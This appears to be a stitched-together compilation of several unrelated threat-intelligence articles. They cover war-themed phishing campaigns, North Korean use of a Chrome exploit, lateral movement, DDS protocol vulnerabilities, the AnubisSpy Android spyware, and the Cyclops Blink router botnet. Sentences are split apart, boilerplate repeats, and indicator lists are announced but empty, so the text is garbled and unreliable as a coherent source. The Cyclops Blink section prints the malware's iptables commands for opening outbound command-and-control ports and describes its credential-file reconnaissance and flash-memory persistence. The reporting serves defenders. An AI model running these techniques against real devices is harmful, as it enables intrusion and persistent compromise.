"The team continues to work around the clock, focusing on the safety and security of our users and the platforms that help them access and share important information."
"We’ll continue to take action, identify bad actors and share relevant information with others across industry and governments, with the goal of bringing awareness to these issues, protecting users and preventing future attacks."
"In early March, Google’s Threat Analysis Group (TAG) published an update on the cyber activity it was tracking with regard to the war in Ukraine."
"Since our last update, TAG has observed a continuously growing number of threat actors using the war as a lure in phishing and malware campaigns."
Financially motivated and criminal actors are also using current events as a means for targeting users.
TAG has also continued to observe multiple ransomware brokers continuing to operate in a business as usual sense.
"As always, we continue to publish details surrounding the actions we take against coordinated influence operations in our quarterly TAG bulletin."
"We promptly identify and remove any such content, but have not observed any significant shifts from the normal levels of activity that occur in the region."
"Here is a deeper look at the campaign activity TAG has observed over the past two weeks: Curious Gorge, a group TAG attributes to China's PLA SSF, has conducted campaigns against government and military organizations in Ukraine, Russia, Kazakhstan, and Mongolia."
"While this activity largely does not impact Google products, we remain engaged and are providing notifications to victim organizations."
"Recently observed IPs used in Curious Gorge campaigns: COLDRIVER, a Russian-based threat actor sometimes referred to as Calisto, has launched credential phishing campaigns, targeting several US based NGOs and think tanks, the military of a Balkans country, and a Ukraine based defense contractor."
"However, for the first time, TAG has observed COLDRIVER campaigns targeting the military of multiple Eastern European countries, as well as a NATO Centre of Excellence."
"These campaigns were sent using newly created Gmail accounts to non-Google accounts, so the success rate of these campaigns is unknown."
We have not observed any Gmail accounts successfully compromised during these campaigns.
"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, recently introduced a new capability into their credential phishing campaigns."
"In mid-March, a security researcher released a blog post detailing a 'Browser in the Browser' phishing technique."
"While TAG has previously observed this technique being used by multiple government-backed actors, the media picked up on this blog post, publishing several stories highlighting this phishing capability."
"Ghostwriter actors have quickly adopted this new technique, combining it with a previously observed technique, hosting credential phishing landing pages on compromised sites."
"The new technique, displayed below, draws a login page that appears to be on the passport.i.ua domain, overtop of the page hosted on the compromised site."
"Once a user provides credentials in the dialog, they are posted to an attacker controlled domain."
Recently observed Ghostwriter credential phishing domains:
"The team continues to work around the clock, focusing on the safety and security of our users and the platforms that help them access and share important information."
"We’ll continue to take action, identify bad actors and share relevant information with others across industry and governments, with the goal of bringing awareness to these issues, protecting users and preventing future attacks."
"On February 10, Threat Analysis Group discovered two distinct North Korean government-backed attacker groups exploiting a remote code execution vulnerability in Chrome, CVE-2022-0609."
These groups' activity has been publicly tracked as Operation Dream Job and Operation AppleJeus.
"However, other organizations and countries may have been targeted."
One of the campaigns has direct infrastructure overlap with a campaign targeting security researchers which we reported on last year.
"The exploit was patched on February 14, 2022."
"The earliest evidence we have of this exploit kit being actively deployed is January 4, 2022."
"We suspect that these groups work for the same entity with a shared supply chain, hence the use of the same exploit kit, but each operate with a different mission set and deploy different techniques."
It is possible that other North Korean government-backed attackers have access to the same exploit kit.
"In this blog, we will walk through the observed tactics, techniques and procedures, share relevant IOCs and analyze the exploit kit used by the attackers."
"In line with our current disclosure policy, we are providing these details 30 days after the patch release."
"The campaign, consistent with Operation Dream Job, targeted over 250 individuals working for 10 different news media, domain registrars, web hosting providers and software vendors."
"The targets received emails claiming to come from recruiters at Disney, Google and Oracle with fake potential job opportunities."
The emails contained links spoofing legitimate job hunting websites like Indeed and ZipRecruiter.
Victims who clicked on the links would be served a hidden iframe that would trigger the exploit kit.
Attacker-Owned Fake Job Domains: Exploitation URLs:
"Another North Korean group, whose activity has been publicly tracked as Operation AppleJeus, targeted over 85 users in cryptocurrency and fintech industries leveraging the same exploit kit."
This included compromising at least two legitimate fintech company websites and hosting hidden iframes to serve the exploit kit to visitors.
"In other cases, we observed fake websites — already set up to distribute trojanized cryptocurrency applications — hosting iframes and pointing their visitors to the exploit kit."
Attacker-Owned Websites: Compromised Websites (Feb 7 - Feb 9): Exploitation URLs:
The attackers made use of an exploit kit that contained multiple stages and components in order to exploit targeted users.
"The attackers placed links to the exploit kit within hidden iframes, which they embedded on both websites they owned as well as some websites they compromised."
The kit initially serves some heavily obfuscated javascript used to fingerprint the target system.
"This script collected all available client information such as the user-agent, resolution, etc. and then sent it back to the exploitation server."
"If a set of unknown requirements were met, the client would be served a Chrome RCE exploit and some additional javascript."
"If the RCE was successful, the javascript would request the next stage referenced within the script as “SBX”, a common acronym for Sandbox Escape."
We unfortunately were unable to recover any of the stages that followed the initial RCE.
"Careful to protect their exploits, the attackers deployed multiple safeguards to make it difficult for security teams to recover any of the stages."
"These safeguards included: Although we recovered a Chrome RCE, we also found evidence where the attackers specifically checked for visitors using Safari on MacOS or Firefox (on any OS), and directed them to specific links on known exploitation servers."
We did not recover any responses from those URLs.
Example Exploit Kit:
"The attackers made multiple attempts to use the exploit days after the vulnerability was patched on February 14, which stresses the importance of applying security updates as they become available."
"As part of our efforts to combat serious threat actors, we use results of our research to improve the safety and security of our products."
"Upon discovery, all identified websites and domains were added to Safe Browsing to protect users from further exploitation."
We also sent all targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity.
We encourage any potential targets to enable Enhanced Safe Browsing for Chrome and ensure that all devices are updated.
"TAG is committed to sharing our findings as a way of raising awareness with the security community, and with companies and individuals that might have been targeted or suffered from these activities."
We hope that improved understanding of the tactics and techniques will enhance threat hunting capability and lead to stronger user protections across industry.
"&amp;nbsp; [Lightly edited transcript of the video above] Hi there, Mark Nunnikhoven from Trend Micro Research, I want to talk to you about the concept of lateral movement."
And the reason why I want to tackle this today is because I've had some conversations in the last few days that have really kind of hit that idea bulb that people don't truly understand how cybercriminals get away with their crimes in the organization.
Specifically how they launch their attacks
"Now don't get me wrong, this isn't to blame on defenders."
This isn't to blame of the general public.
"I'm going to go with Hollywood's to blame a little bit here, because we're watching movies in Hollywood inevitably…you know the hackers in their dark hat and with no lighting, underground, Lord knows where they find these places to hack from and they are attacking directly through."
"You see a bunch of text go across the screen and they penetrate through the first firewall, through the second firewall in into the data."
That's not how it works at all.
That's ridiculous.
It's absurd.
"[00:59] It makes for interesting cinema, just like the red code/green code in CSI Cyber, but it's not a reflection of reality and that's a real challenge."
"Because a lot of people don't have the experience of working with cybersecurity, working in cybersecurity, so their only perception is what they see either through media—you know TV, movies, books—or if they happen to run into somebody at in the industry."
So there is an overwhelming amount of sort of information or misinformation.
"Not even misinformation, just storytelling that tries to make it far more dramatic than it is."
The reality is that cybercriminals are out for profit.
"We know this time and time again—yes a bunch of nation-state stuff does happen but the vast majority of you are unaffected by it same with there's a massive amount of script-kiddie just sort of scanning random people with random tools that are just seeing what they can get away with that and if you have solid, automated defenses that doesn't really impact you."
What does impact you is the vast majority of organized cybercriminals who are out to make a profit.
"Trend Micro had a great series and continues to have a great series on the Underground, the Digital Underground that shows just how deep these profit motivations go."
This is very much a dark industry.
And with that in mind we come back to the concept of lateral movement.
"[02:22] If an attacker breaches into your systems, whether they come in like a fourth of all attacks do via email whether they come in directly through a server compromise, which is about half of all breaches according to the Verizon data breach investigation report or one of the other methods that is commonly used…then they start to move around within your network."
That's lateral movement.
"We talk about north/south traffic with the network, which is basically inside the network to outside of the network, so out to the the internet and back."
East/west is within the network itself.
"Most defenses, traditional defenses worry about that north/south traffic."
Not enough worry about the east/west and it's breaking down finally.
We are getting rid of this hard perimeter.
"""It's mine, I defend everything inside"" …and realizing that this is actually how cybercriminals work."
Once they're inside they move around.
So we need to defend in-depth and have really great monitoring and protection tools within our networks because of this challenge of lateral movement.
[03:23] Let me give you a little easier to digest analogy.
Most of us in a home have a grocery list and maybe once a week—maybe twice–we head to the grocery store and we try to get everything we want off the list and then we come back.
That just makes sense.
That's how we do it.
Right?
"You would never think of going, ""Okay."
Number one of the list is ketchup.
I'm going to drive to the store to get ketchup.
I'm going to buy it and I'm going to come back home.
I'm going to look at item number two.
I need a loaf of bread.
I'm going to drive back to the store.
"I'm going to buy a loaf of bread and I'm going to come back and we can go to item 3, and I'm going to go and I'm going to come back."
"I'm going to..."""
"That's just ridiculous, right?"
That's absolutely absurd and cybercrimals agree.
Once they've driven to the store.
"They're going to buy everything that they need and everything that they see as an opportunity, right?"
They are really susceptible to those end caps and impulse buys... and then they're going to leave.
This is how they attack our organizations.
"We know that, because of the average time to detect a breach is around 197 days right now and that stat has fluctuated maybe plus or minus 15 days for the last decade."
We also know that it takes almost three…it takes two and a half to three months actually contain a breach once you discover it and the reason for all of this is lateral movement.
"Once you're in as a cybercriminal, once you've made headway, once you gained a beachhead or a foothold within that network you're going to do everything you can to expand it because it's going to make you the most amount of money."
[04:55] What do you think?
"Let us know in the comments below, hit us up on social @TrendMicro or you can reach me directly @marknca."
How are you handling lateral movement?
How are you trying to reduce it?
How are you looking for visibility across all of your systems?
Let's continue this conversation because when we talk we all get better and more secure online.
"Tags Cloud | APT & Targeted Attacks | Cyber Crime | Expert Perspective | Network | Articles, News, Reports"
"By Federico Maggi, Rainer Vosseler (Trend Micro Research), Mars Cheng, Patrick Kuo, Chizuru Toyama, Ta-Lun Yen (TXOne Networks), Erik Boasson (ADLINK), and Victor Mayoral Vilches (Alias Robotics)"
"Despite being unknown even to industry practitioners, the Data Distribution Service (DDS) protocol has been in use for more than a decade."
This middleware software technology is responsible for running billions of public and private devices and mechanisms currently in use.
"DDS is integral in embedded systems that require real-time machine-to-machine communication, facilitating a reliable communication layer between sensors, controllers, and actuators."
"This technology is situated at the beginning of the supply chain as a layer that connects, controls, and monitors applications, sensors, and actuators, aimed at maintaining interoperability and fault tolerance."
"It is used in various critical sectors such as healthcare, transportation, industrial internet of things (IIoT), robotics, aeronautics, and the military, among others."
"Given these factors, this makes the middleware technology an attractive target for attackers."
We analyzed this software and found multiple security vulnerabilities.
"This blog lists 13 identified security gaps that were assigned new CVE IDs found in the six most common DDS implementations, mostly concerning deployment."
We also show a preview of the security gaps we found in the standard’s specification and a summary of our testing procedure.
"For details on the known vulnerabilities, attack scenarios, and research methodology, read our full paper “A Security Analysis of the Data Distribution Service (DDS) Protocol.”"
All the vulnerabilities found have been disclosed and patched or mitigated by their respective vendors.
New vulnerabilities
"We studied six widely used DDS implementations, chosen based on executions’ number of users and customers in the critical sectors globally."
"We also looked at each implementation’s real-time publish-subscribe (RTPS) packet, as DDS is dependent on its own lower layer standard protocol."
"Notably, we also studied the Robot Operating System 2 (ROS 2) because it uses DDS as its default standard operating system (OS) middleware for all robotics and automation use cases."
"Given the service’s position as a security and operations building block, all vulnerabilities that affect DDS also affect the rest of the software stack, such as RTPS and all ROS 2 instances."
Product Name
Developer HQ Region Open Source
"Core Language Year Developed Fast-DDS eProsima EMEA Apache License 2.0 C++ 2014 Cyclone DDS Eclipse Foundation project, driven by ADLINK EMEA Eclipse Public License 2.0 and Eclipse Development License 1.0 C 2011 OpenDDS OCI NABU Custom C++ 2005 Connext DDS RTI NABU Extensions are open source C++ 2005 (NDDS – 1995) CoreDX DDS TwinOaks NABU Not open source C 2009 Gurum DDS GurumNetworks APAC Not open source C Table 1."
A list of all DDS implementations analyzed for this research.
MITRE ATT&CK ICS Attack Surface Vector CVE Scope CVSS Weaknesses (CWE) T0804:
Brute Force I/O T0814: DoS T0827: Loss of Control T0880: Loss of Safety T0802: Automated Collection T0846: Remote System Discovery T0856: Spoof of Reporting Message
"Network RTPS discovery packet CVE-2021-38425 Fast-DDS, ROS 2 7.5 CWE-406: Network amplification CVE-2021-38429 OpenDDS, ROS 2 7.5 CVE-2021-38487 Connext DDS, ROS 2 7.5 CVE-2021-43547 CoreDX DDS, ROS 2 7.5 Malformed RTPS packet CVE-2021-38447 OpenDDS, ROS 2 8.6 CWE-405:"
"Network amplification CVE-2021-38445 OpenDDS, ROS 2 7.0 CWE-130: Improper handling of length CVE-2021-38423 Gurum DDS, ROS 2 8.6 CWE-131: Incorrect calculation of buffer size CVE-2021-38435 Connext DDS, ROS 2 8.6 CVE-2021-38439 Gurum DDS, ROS 2 8.6 CWE-122:"
Heap-based buffer overflow T0862: Supply Chain Compromise T0839: Module Firmware T0873: Project File Infection
"Configuration XML file CVE-2021-38427 Connext DDS, ROS 2 6.6 CWE-121: Stack-based buffer overflow CVE-2021-38433 Connext DDS, ROS 2 6.6 CVE-2021-38443 Cyclone DDS, ROS 2 6.6 CWE-228: Improper handling of syntactically invalid structure CVE-2021-38441 Cyclone DDS, ROS 2 6.6 CWE-123:"
Write-what-where condition Table 2.
A summary of our findings across the main DDS implementations and standard specification.
"When the security gaps on the network attack surface are exploited, it allows an attacker to perform spoofing, reconnaissance, automated data collection, and denial of service (DoS), affecting the control of an exposed system."
"Meanwhile, the vulnerabilities we found on the configuration attack surface can be abused to affect the DDS developer or system integrator, potentially compromising the integrity of the software supply chain."
Vulnerabilities in the standard specification
The built-in RTPS discovery protocol is used in peer-to-peer networks to discover the locator of each participant (such as IP address and UDP/TCP port or offset in shared memory).
"The “chatty” nature of this discovery protocol and the fact that it expects a reply from each contacted participant, paired with easy-to-spoof transport protocols such as the User Datagram Protocol (UDP), make RTPS vulnerable to network reflection and amplification."
"Confidentiality and authenticity for this data is not protected even with DDS Security, making it possible for an attacker to spoof the information. CVE ID"
Scope
Partially Mitigated*
"BAF Percentage of Attack Duration (Total experiment duration = 139s) CVE-2021-38425 Fast-DDS, ROS 2 master branch 9.875 100.0 CVE-2021-38429 OpenDDS, ROS 2 >= 3.18.1 18.68 24.17 CVE-2021-38487"
"Connext DDS, ROS 2 >= 6.1.0 2.011 84.17 CVE-2021-43547 CoreDX DDS, ROS 2 > 5.9.1 32.82 18.14 Table 3."
The network reflection and amplification vulnerability with bandwidth amplification factor (BAF) is calculated as the ratio between outbound and reflected traffic.
Note: Implementations with less than 100% attack duration likely have a timeout mechanism.
(*) A full mitigation will require relevant changes in the RTPS specification.
"The longest running node was based on Connext DDS (at 139 seconds), which we kept as a reference."
"Table 3 shows that the BAF is greater than one, implying there are asymmetric network flows although the values are at the order of magnitude lower than modern amplification attacks (note that Memcached can reach 10,000 to 51,000 BAF)."
"However, the network bandwidth in embedded systems is also lower than, for example, what internet nodes can provide."
An attacker can abuse this built-in discovery feature for remote discovery and fingerprinting.
We sent RPTS discovery probes to the entire IPv4 space (except for the no-scan subnets) and received answers from 643 hosts (excluding obvious honeypots).
"Notably, hosts never stopped sending traffic to us, even if we only sent them a single 288-byte packet."
This new network-reflection vulnerability that we found is not the only instance of a specification-level vulnerability.
Security researchers from different organizations have been documenting and creating attack scenarios abusing these vulnerabilities as early as 2015.
Conclusion
"Proper supply chain management processes allow contextualization, tracking, and monitoring of new vulnerabilities within different downstream software using a specific library such as DDS."
"In the case of this middleware technology, DDS is just one of the many critical libraries used in embedded applications that’s easy to lose track of."
"Our paper, “A Security Analysis of the Data Distribution Service (DDS) Protocol,” includes short- and long-term mitigation best practices and recommendations, as well as a consideration for adopting a shift-left approach."
We also acknowledge the cooperation and engaging response that some vendors like ADLINK have adopted when we approached them with our findings.
"As we encourage more DDS researchers, users, and implementors to keep on studying and promoting security awareness for the DDS ecosystem, we hope the level of engagement we received can serve as a model for the software industry."
Download our full paper here.
"Tags Exploits & Vulnerabilities | Research | Cyber Threats | ICS OT | APT & Targeted Attacks | Compliance & Risks | IoT | Articles, News, Reports"
Android malware like ransomware exemplify how the platform can be lucrative for cybercriminals.
"But there are also other threats stirring up as of late: attacks that spy on and steal data from specific targets, crossing over between desktops and mobile devices."
These were published on Google Play — but have since been taken down — and third-party app marketplaces.
We named these malicious apps AnubisSpy (ANDROIDOS_ANUBISSPY) as all the malware’s payload is a package called watchdog.
We construe AnubisSpy to be linked to the cyberespionage campaign Sphinx (APT-C-15) based on shared file structures and command-and-control (C&C) server as well as targets.
"It’s also possible that while AnubisSpy’s operators may also be Sphinx’s, they could be running separate but similar campaigns."
What can AnubisSpy do?
"AnubisSpy can steal messages (SMS), photos, videos, contacts, email accounts, calendar events, and browser histories (i.e., Chrome and Samsung Internet Browser)."
"It can also take screenshots and record audio, including calls."
"It can spy on the victim through apps installed on the device, a list of which is in its configuration file that can be updated."
"This includes Skype, WhatsApp, Facebook, and Twitter, among others."
"After the data are collected, they are encrypted and sent to the (C&C) server."
AnubisSpy can also self-destruct to cover its tracks.
"It can run commands and delete files on the device, as well as install and uninstall Android Application Packages (APKs)."
"AnubisSpy has several modules, each of which has a separate role."
"AnubisSpy’s code is well constructed, indicating the developer/s’ know-how."
Below is a visualization of the modules: Figure 1: Structure of AnubisSpy’s modules
How is AnubisSpy related to Sphinx?
Sphinx reportedly uses the watering hole technique via social media sites to deliver its payloads — mainly a customized version of njRAT.
The Sphinx campaign operators cloaked the malware with icons of legitimate applications to dupe recipients into clicking them.
"Sphinx was active between June 2014 and November 2015, but timestamps of the malware indicate the attacks started as early as 2011."
A simple WHOIS query of AnubisSpy’s C&C server showed it abused a legitimate managed hosting service provider in Belize.
"We correlated the AnubisSpy variants to Sphinx’s desktop/PC-targeting malware through the following: Shared C&C server, 86[.]105[.]18[.]107 Shared technique of decrypting JSON files, and similarity between the file structures of AnubisSpy and Sphinx’s malware Similar targets (highly concentrated in Middle Eastern countries) Figure 2: Comparison of file structure in Sphinx’s desktop/PC-targeting malware (left) and AnubisSpy (right)"
Our coordination with Google also revealed that these apps were installed across a handful of countries in the Middle East.
Was AnubisSpy actively distributed?
We analyzed seven apps that were actually AnubisSpy.
These were signed with the same fake Google certificates.
"We found two more apps created by the same developer, but they had no espionage-related codes; we think they were made as experimental projects."
"Based on hardcoded strings in the Agent Version, the malicious apps were developed as early as April 2015."
Timestamps indicate that the earliest sample was signed on June 2015; the latest variant was signed on May 2017.
AnubisSpy wasn’t only published on Google Play.
"We also found versions of it in third-party app marketplaces, most likely as a way to expand the malware’s reach."
The apps mainly used Middle East-based news and sociopolitical themes as social engineering hooks and abused social media to further proliferate.
"Versions of AnubisSpy posed as social news, promotional, healthcare, and entertainment apps."
What does AnubisSpy mean to the mobile landscape?
Persistent and furtive spyware is an underrated problem for the mobile platform.
"While cyberespionage campaigns on mobile devices may be few and far between compared to ones for desktops or PCs, AnubisSpy proves that they do indeed occur, and may have been more active than initially thought."
Will mobile become cyberespionage’s main frontier?
"It won’t be a surprise given mobile platform’s increasing ubiquity, especially in workplaces."
"Beyond its effects, AnubisSpy also highlights the significance of proactively securing mobile devices, particularly if they’re on BYOD programs and used to access sensitive data."
Enforcing the principle of least privilege and implementing an app reputation system are just some of the best practices that can help mitigate threats.
We disclosed our findings to Google on October 12 and worked with Google on further analyzing the AnubisSpy-related apps.
Updates were also made to Google Play Protect to take appropriate action against those apps that have been verified as in violation of Google Play policy.
"An in-depth technical analysis of AnubisSpy, along with indicators of compromise, is in this technical brief."
Trend Micro Solutions End users and enterprises can also benefit from multilayered mobile security solutions such as Trend Micro™ Mobile Security which is also available on Google Play.
"For organizations, Trend Micro™ Mobile Security for Enterprise provides device, compliance and application management, data protection, and configuration provisioning, as well as protects devices from attacks that leverage vulnerabilities, preventing unauthorized access to apps, as well as detecting and blocking malware and fraudulent websites."
Trend Micro’s Mobile App Reputation Service (MARS) covers Android and iOS threats using leading sandbox and machine learning technologies.
"It can protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerability."
Tags Malware | APT & Targeted Attacks | Endpoints | Research |
Mobile
"With additional insights from Philippe Z Lin Note: This article has been updated on March 17, 2022, 2:00 a.m. ET to include Asus’ security bulletin."
"Cyclops Blink, an advanced modular botnet that is reportedly linked to the Sandworm or Voodoo Bear advanced persistent threat (APT) group, has recently been used to target WatchGuard Firebox devices according to an analysis performed by the UK’s National Cyber Security Centre (NCSC)."
We acquired a variant of the Cyclops Blink malware family that targets Asus routers.
This report discusses the technical capabilities of this Cyclops Blink malware variant and includes a list of more than 150 current and historical command-and-control (C&C) servers of the Cyclops Blink botnet.
This list aims to aid cybersecurity defenders in searching for affected devices in their networks and starting the remediation process.
"We have reached out to Asus regarding our investigation, and they have created a security bulletin that includes a security checklist to help prevent Cyclops Blink attacks, as well as a list of affected Asus products."
"Our data also shows that although Cyclops Blink is a state-sponsored botnet, its C&C servers and bots affect WatchGuard Firebox and Asus devices that do not belong to critical organizations, or those that have an evident value on economic, political, or military espionage."
"Hence, we believe that it is possible that the Cyclops Blink botnet’s main purpose is to build an infrastructure for further attacks on high-value targets."
"Cyclops Blink has been around since at least June 2019, and a considerable number of its C&C servers and bots are active for up to about three years."
The Sandworm APT group has been attributed as creating both Cyclops Blink and the VPNFilter internet of things (IoT) botnet.
"VPNFilter, first discovered in 2018, targeted router and storage devices."
It was also reported to have infected hundreds of thousands of devices.
"In 2021, Trend Micro published a technical analysis of VPNFilter, which includes a discussion of how the botnet continues to affect infected systems two years after its discovery."
"Sandworm was also responsible for many high-profile attacks, including the 2015 and 2016 attacks on the Ukrainian electrical grid, the 2017 NotPetya attack, the 2017 French presidential campaign, the 2018 Olympic Destroyer attack on the Winter Olympic Games, and a 2018 operation against the Organization for the Prohibition of Chemical Weapons (OPCW). Cyclops Blink malware analysis Cyclops Blink is a modular malware written in the C language."
"In its core component, the first thing that the malware does is to check if its executable file name starts with ""[k""."
"If it does not, it performs the following routine: It redirects both stdout and stderr file descriptors to /dev/null."
"It sets the default handlers for SIGTERM, SIGINT, SIGBUS, SIGPIPE, and SIGIO signals."
"It reloads itself with a new ""[ktest]"" process name."
It then waits for 37 seconds before it sets up its hard-coded parameters.
These include the hard-coded C&C servers and the interval that should be used to communicate with the C&C servers.
It also creates a pipe for inter-process communication (IPC) by calling the pipe() function for getting two file descriptors for reading and writing data.
It also enables non-blocking I/O for the writing file descriptor by using ioctl().
"After this, a new data packet will be created in memory, which will then be sent to a C&C server."
The details of this communication are covered later in this analysis.
"For every hard-coded TCP port used to communicate with the C&C servers, the malware creates a rule in Netfilter — the Linux kernel firewall — using the iptc_insert_entry() function from libiptc1 to allow output communication to it."
The rules have the following parameters: Protocol: TCP Chain: filter Table: OUTPUT Action: ACCEPT
"Destination ports: 636, 994, and 995"
"For an unknown reason, the malware deletes the aforementioned rules and creates them again, this time using the iptables command via the system() function."
The commands are as follows: iptables -D OUTPUT -p tcp --dport %d -j ACCEPT iptables -I OUTPUT -p tcp --dport %d -j ACCEPT
"The OpenSSL library is then initialized, and the core component proceeds to initialize the hard-coded modules."
Modules initialization
"During this part, the core component initializes the modules."
Communication with the modules is performed via pipes.
"For each hard-coded module, the malware creates two pipes before executing them in their own child processes."
Figure 1.
"The function that initializes the modules In Figure 1, we inferred the following mod_t structure: Figure 2."
Inferred mod_t structure; the last member is unknown.
Parameters
The parameters are then initialized.
They consist of a 592-byte structure containing essential information sent to the modules via pipes.
"This information includes: A “<p: ” string header The pipe of the core component All C&C IP addresses and ports The local IP address An interval for C&C server communication When the next packet to be sent to a C&C server is The main process PID A hard-coded ID (we saw 0xA08F078B, 0xBD0A5B36, and 0xA244E5E2) The parameters are pushed to the modules, which are initialized at this point. C&C communication"
"After obtaining data from the modules, the core component starts the encryption routines that will cipher the data before sending it to the C&C server."
Encryption Cyclops Blink encrypts data using OpenSSL functions that should be available in the infected device as they are dynamically loaded.
The data is encrypted using AES-256 in cipher block chaining (CBC) mode with a randomly generated 256-bit key and 128-bit initialization vector (IV).
It is then encrypted using a hard-coded RSA-2560 (320-bit) public key unique to each sample.
The malware authors decided to use the EVP_SealInit() function.
"This function performs all of the aforementioned encryption steps, including the random AES key and IV generation."
The C&C server must have the corresponding RSA private key to decrypt the data.
"After encryption, if the total packet length is greater than 98,303 bytes, the packet is sent."
Data transferring
"To send data to the C&C server, the core component performs a TLS handshake with a randomly chosen C&C server at a random TCP port, both of which are from a hard-coded list."
"After choosing an IP address and a TCP port pair, the core component creates a child process to perform the communication."
The child process will connect to the C&C server and write four bytes to the SSL socket.
These four bytes are the packet size that it wants to send.
Figure 3.
The child process writes four bytes to the SSL socket.
"The server must reply with an exact four-byte answer, which is the victim's IPv4 address."
10 bytes are then written to the core component pipe.
The data follows a specific format.
For example: Packet length Target module Command Data (victim's IPv4 address) 00 00 00 0a 00 07 c0 a8 00 01
The core component then receives more data from the C&C server.
"This time, it expects an encrypted packet to be decrypted using the hard-coded RSA-2560 public key."
The malware expects a response where the first four bytes are the size of the packet followed by the encrypted data.
Figure 4.
"Core component code that receives and decrypts data from the C&C server If something is received, it is decrypted and written to the main pipe."
"For decryption, the malware uses the RSA_public_decrypt() function, which decrypts data encrypted with a corresponding private key, leveraging the “reversibility” of the RSA encryption algorithm."
"Finally, a variable containg the next time a packet should be sent is updated and all of the parameters are sent to the modules again."
This is because the core component can receive new parameters from the C&C servers.
Commands
The data received from the C&C servers comprises either commands to the core component itself or to one of its modules.
"First, the core component sends the supported commands to the C&C server and then enters in a loop where it expects one of the commands."
"If a command targets the core component, it can be one of the following: Command ID Action 0 Terminates the program 1 Bypasses the data-sending interval and sends data to C&C servers immediately 2 Adds a new C&C server to the list in memory 3 Sets time to send the next packet to the C&C server 4 Sets time to send the next packet to the C&C server 5 Adds a new module (an ELF file should be received following the command)"
6 Reloads the malware 7 Sets the local IP address parameter 8 Sets a new worker ID 9 Sets an unknown byte value 10 Resends configuration to all running modules Modules Asus (0x38) This module can read and write from the devices' flash memory.
"The flash memory is used by these devices to store the operating system, configuration, and all files from the file system."
"Our research was carried out on the RT-AC68U, but other Asus routers such as RT-AC56U might be affected as well."
"It’s important to note, however, that since the malware is modular in nature, it can be easily recompiled to target any other device."
"The samples we’ve obtained work in the conditions mentioned in this report, but the malware actors seem ready to target any other router model or brand."
"In fact, this is what they have done with WatchGuard — it’s the same code, but it has been recompiled for the brand. First, the module examines the content /proc/mtd file, which provides general information about the devices’ Memory Technology Device (MTD) subsystem."
The MTD provides an abstraction layer to access the device's flash memory.
The malware looks for the strings “linux” and “rootfs” and reads it using a printf()-like format: Figure 5.
The module looks for “linux” and “rootfs” strings The inferred mdt_data_t structure is as follows: Figure 6.
The mtd_data_t structure The data is read to this structure.
The content of /proc/mtd for an Asus RT-AC68U device is as follows: Figure 7.
Typical /proc/
mtd
from an Asus RT-AC68U router
"Therefore, for the case here, the malware would open /dev/mtd2, which is the partition where the Linux kernel image is stored."
Why the malware authors decided to read either “linux” or “rootfs” partition is unclear.
"Based on our knowledge, they have quite different purposes."
"While the first holds the operating system, the second stores programs’ critical files, such as executables, data, and libraries."
"Cyclops Blink reads 80 bytes from the flash memory, writes it to the main pipe, and enters a loop to wait for a command to replace the partition content: Figure 8."
"Asus module main loop If the data coming from the core component starts with “<p:”, it means that it is a parameter for this module and 80 bytes will be written to the flash memory, effectively replacing its content."
The writing is done by the j_save_data() function.
"It does this by correctly erasing the NAND eraseblocks first via ioctl() calls, and then writing the new content to them, as the following image shows: Figure 9."
Cyclops
Blink
"Asus module code for writing to raw flash memory As the flash memory content is permanent, this module can be used to establish persistence and survive factory resets."
"Although it cannot be used as proof of attribution, the preceding code reminded us of a routine from the third-stage code of VPNFilter’s process called “dstr” that was intended to “brick” the infected device."
"Apart from deleting many important files and even trying to delete the whole root file system, this particular VPNFilter stage also writes many 0xff bytes to the raw flash memory:"
Figure 10. VPNFilter “dstr” third-stage code for writing to raw flash memory System reconnaissance (0x08) This module is responsible for sending information from the infected device to the C&C server.
"The following data is obtained from an infected device: The Linux version, which the module gets by calling the uname() function and /etc/issue file Information about the device’s memory consumption, which it gets by calling the sysinfo() function The SSD storage information, which it gets by calling the statvfs() function The content of the following files: /etc/passwd /etc/group /proc/mounts /proc/partitions Information about the network interfaces, which it gets by calling the if_nameindex() and iotctl() functions with the SIOCGIFHWADDR and SIOCGIFADDR commands."
File download (0x0f) This module can download files from the internet.
The DNS resolution is performed using DNS over HTTPS (DoH).
The malware sends an HTTP POST request to a Google DNS Server (8.8.8.8) using the following headers: Figure 11.
HTTP POST request over SSL for DNS resolution This module seems to be an earlier version of the same module (0x0f) that is used by the Cyclops Blink variant reported by NCSC.
The main differences between the modules are as follows: This module does not have an upload feature. The 0x1 bit in the control flags is used in this module to specify if the download should be done via HTTPS. Infrastructure
We have been able to determine that the botnet of Cyclops Blink infected routers from both compromised WatchGuard devices and Asus routers.
These compromised devices periodically connect to C&C servers that are themselves hosted on compromised WatchGuard devices.
"We have evidence that the routers of at least one vendor other than Asus and WatchGuard are connecting to Cyclops Blink C&Cs as well, but so far we have been unable to collect malware samples for this router brand."
The botnet of Cyclops Blink has been around for some time.
"Using historical data of internet-wide scans and SSL certificate data, it is likely that Cyclops Blink dates back to at least June 2019."
"Since June 2019, the actor has issued more than 50 SSL certificates that were used on WatchGuard C&Cs on various TCP ports (as far as we are aware, the following TCP ports were used: 636, 989, 990, 994, 995, 3269, and 8443)."
"In Appendix A, we have listed both the live and inactive C&Cs used by Cyclops Blink for the benefit of network defenders."
We have observed that some of the WatchGuard and Asus bots were never cleaned up because these routers still try to connect periodically to old C&Cs that were secured or taken offline.
Figure 12.
The timeline of several SSL certificates that were issued for Cyclops Blink C&Cs Our investigation shows that there are more than 200 Cyclops Blink victims around the world.
"It should be noted that these victims do not appear to be evidently valuable targets for either economic, military, or political espionage."
"This is in line with the increasing number of brute-force attacks performed by other APT groups such as Pawn Storm, a group that has compromised numerous assets like email addresses and email servers of targets that are typically not aligned with Pawn Storm’s objectives."
"Just like Pawn Storm, Sandworm is fishing with a wide net or looking to compromise assets on a larger scale."
Figure 13.
The number of months that Cyclops Blink C&Cs have been live; it is important to note that live C&Cs during the time of reporting have been included.
Conclusion and security recommendations
"Over the past few years, IoT attacks have been escalating globally and internet routers have been one of the primary targets."
"There are several reasons that these devices are favored by an attacker — the infrequency of patching, the lack of security software, and the limited visibility of defenders."
"Combined, these allow for the possibility of what we refer to as ""eternal botnets."""
"Once an IoT device is infected with malware, an attacker can have unrestricted internet access for downloading and deploying more stages of malware for reconnaissance, espionage, proxying, or anything else that the attacker wants to do."
"The underlying operating systems for the majority of IoT devices is Linux, which is also used by many powerful systems tools."
This can allow attackers to add anything else that they might need to complete their attacks.
